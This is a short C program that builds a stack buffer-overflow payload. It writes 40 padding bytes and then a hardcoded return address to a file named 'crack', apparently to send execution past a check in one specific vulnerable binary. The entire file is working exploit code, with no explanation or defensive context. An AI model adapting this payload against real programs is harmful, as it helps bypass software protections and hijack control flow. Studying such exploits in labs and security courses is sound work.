#include <stdio.h>

int main() {

    // x86_64, 8 byte pointers
    // unsigned long rbp_addr = 0x00007ffffffe00f0;
    unsigned long rip_addr = 0x0000000008001260;
    FILE *file = fopen("crack", "w");

    if (file == NULL) {
        printf("Error opening file\n");
        return 0;
    }

    for (int i = 0; i < 40; i++) {
        fprintf(file, "%c", '1');
    }

    // rbp addr
    // for (int i = 0; i < 8; i++) {
    //     fprintf(file, "%c", (char)(rbp_addr >> (i*8)));
    // }

    for (int i = 0; i < 8; i++) {
        fprintf(file, "%c", (char)(rip_addr >> (i*8)));
    }
    
    fclose(file);

    return 0;
}